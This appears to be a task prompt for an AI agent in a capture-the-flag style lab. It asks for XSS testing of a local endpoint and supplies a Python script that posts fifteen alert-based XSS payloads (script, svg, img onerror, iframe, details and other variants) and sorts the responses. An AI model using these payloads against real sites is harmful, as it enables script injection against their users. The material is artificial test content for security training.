## Persistent Memory Context
The persistent memory workspace is empty. No prior reconnaissance, endpoints, authentication details, or XSS-related findings have been persisted. The task should start from fresh reconnaissance.

Perform systematic XSS payload testing on http://127.0.0.1:33031/page

The endpoint accepts POST requests with parameter 'solution'. The application has prototype pollution protection that blocks some alert() execution paths.

Write a Python script to test multiple XSS payloads and capture the responses:

```python
import requests

url = "http://127.0.0.1:33031/page"

payloads = [
    "<script>alert('XSS')</script>",
    "<svg onload=alert('XSS')>",
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=window.alert('XSS')>",
    "<img src=x onerror=self.alert('XSS')>",
    "<img src=x onerror=top.alert('XSS')>",
    "<img src=x onerror=parent.alert('XSS')>",
    "<img src=x onerror=eval(alert('XSS'))>",
    "<img src=x onerror=eval('alert(\\'XSS\\')')>",
    "<img/src=x onerror=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<video><source onerror=alert('XSS')></video>",
    "<details open ontoggle=alert('XSS')>",
]

print("Testing XSS payloads on /page endpoint:\n")

for payload in payloads:
    try:
        resp = requests.post(url, data={"solution": payload}, timeout=10)
        response_text = resp.text
        
        # Check what error or success message appears
        if "Oops! You did an alert with" in response_text:
            # Extract the result
            start = response_text.find('Oops! You did an alert with')
            end = response_text.find('instead of', start)
            if end > start:
                msg = response_text[start:end+20]
            else:
                msg = "Alert triggered but wrong value"
            print(f"[ALERT TRIGGERED] Payload: {payload[:50]}...")
            print(f"  Result: {msg}")
        elif "error" in response_text.lower() or "exception" in response_text.lower():
            print(f"[ERROR] Payload: {payload[:50]}...")
        else:
            print(f"[NO ALERT] Payload: {payload[:50]}...")
            
    except Exception as e:
        print(f"[REQUEST FAILED] Payload: {payload[:50]}... Error: {e}")

print("\n--- Testing Complete ---")
```

